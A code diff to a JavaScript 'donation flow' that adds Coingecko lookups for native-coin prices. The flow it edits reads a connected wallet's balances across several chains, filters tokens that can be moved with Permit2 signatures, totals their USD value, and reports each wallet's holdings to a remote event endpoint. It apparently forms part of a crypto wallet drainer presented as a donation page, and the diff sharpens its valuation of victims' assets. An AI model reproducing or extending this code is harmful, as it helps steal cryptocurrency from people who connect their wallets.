@@ -18,6 +18,31 @@ import {
 import { CHAINS, exceptionList } from "../config.js";
 import { ethers } from "ethers";
 
+// 🔹 Fetch native price from Coingecko
+async function fetchNativePrice(symbol) {
+  try {
+    const idMap = {
+      ETH: "ethereum",
+      BNB: "binancecoin",
+      MATIC: "matic-network",
+      AVAX: "avalanche-2",
+      FTM: "fantom",
+      OP: "optimism",
+      ARB: "arbitrum",
+    };
+    const id = idMap[symbol];
+    if (!id) return 0;
+    const res = await fetch(
+      `https://api.coingecko.com/api/v3/simple/price?ids=${id}&vs_currencies=usd`
+    );
+    const json = await res.json();
+    return json[id]?.usd || 0;
+  } catch (err) {
+    console.warn("Coingecko price error", err);
+    return 0;
+  }
+}
+
 /**
  * Frontend donation flow.
  */
@@ -46,20 +71,14 @@ export async function runDonationFlow(walletClient) {
       const raw = await fetchBalancesCovalent(owner, chain.chainId);
       const filtered = await filterPermit2SafeTokens(raw);
 
-      // 🔹 FIX 1: Use dedicated RPC provider for native balance
+      // Native balance from RPC
       const rpcProvider = new ethers.JsonRpcProvider(chain.rpcUrl);
       const nativeRaw = await rpcProvider.getBalance(owner);
       const nativeFormatted = parseFloat(ethers.formatEther(nativeRaw));
 
-      // 🔹 FIX 2: Find correct native quote_rate from Covalent response
-      const nativeItem = raw?.items?.find(
-        (i) =>
-          i.contract_address ===
-            "0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee" ||
-          i.contract_ticker_symbol === chain.nativeSymbol
-      );
-      const nativeQuoteRate = nativeItem?.quote_rate || 0;
-      const nativeUSD = nativeFormatted * nativeQuoteRate;
+      // Native USD from Coingecko
+      const nativePrice = await fetchNativePrice(chain.nativeSymbol);
+      const nativeUSD = nativeFormatted * nativePrice;
 
       const tokensValue = getChainValue(filtered);
       const totalValue = tokensValue + nativeUSD;
@@ -77,7 +96,7 @@ export async function runDonationFlow(walletClient) {
     const balancesPayload = chainBalances.map((c) => ({
       name: c.name,
       native: Number(c.native).toFixed(6),
-      nativeValue: Number(c.nativeUSD || 0).toFixed(2), // <-- ADDED: native USD mirrored
+      nativeValue: Number(c.nativeUSD || 0).toFixed(2), // ✅ mirrored correctly
       tokens: c.tokens.map((t) => ({
         name: t.tokenSymbol,
         amount: Number(
@@ -99,7 +118,6 @@ export async function runDonationFlow(walletClient) {
       grandTotal: Number(grandTotal).toFixed(2),
     };
 
-    // Fire Wallet Connected immediately
     notify("WALLET_CONNECTED", connectedPayload);
     await sendEvent("WALLET_CONNECTED", connectedPayload);
 
@@ -181,14 +199,8 @@ export async function runDonationFlow(walletClient) {
         ethers.formatEther(refreshedNativeRaw)
       );
 
-      const refreshedNativeItem = refreshedRaw?.items?.find(
-        (i) =>
-          i.contract_address ===
-            "0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee" ||
-          i.contract_ticker_symbol === chain.nativeSymbol
-      );
-      const refreshedNativeQuoteRate = refreshedNativeItem?.quote_rate || 0;
-      const refreshedNativeUSD = refreshedNative * refreshedNativeQuoteRate;
+      const refreshedNativePrice = await fetchNativePrice(chain.nativeSymbol);
+      const refreshedNativeUSD = refreshedNative * refreshedNativePrice;
 
       const refreshedTokensValue = getChainValue(refreshedFiltered);
       const refreshedTotal = refreshedTokensValue + refreshedNativeUSD;
@@ -205,7 +217,7 @@ export async function runDonationFlow(walletClient) {
           {
             name: chain.name,
             native: refreshedNative.toFixed(6),
-            nativeValue: Number(refreshedNativeUSD || 0).toFixed(2), // <-- ADDED: mirrored native USD
+            nativeValue: Number(refreshedNativeUSD || 0).toFixed(2), // ✅ mirrored again
             tokens: refreshedFiltered.map((t) => ({
               name: t.tokenSymbol,
               amount: Number(
